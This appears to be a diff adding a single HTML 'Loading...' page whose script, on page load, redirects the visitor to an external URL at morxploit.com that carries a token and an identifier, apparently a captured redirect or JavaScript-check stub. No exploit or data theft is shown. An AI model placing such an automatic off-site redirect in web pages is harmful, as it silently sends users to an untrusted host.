@@ -1,0 +1,1 @@
+<html><head><title>Loading...</title></head><body><script type='text/javascript'>window.location.replace('http://morxploit.com/morxtools/binex.cc?js=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqcyI6MX0.fADWc9hUOlh58R9UzufQBROmie3I7c7vE835oE6YmU4&uuid=69a2931e-bf43-11e8-aac8-b8687d35547b');</script></body></html>
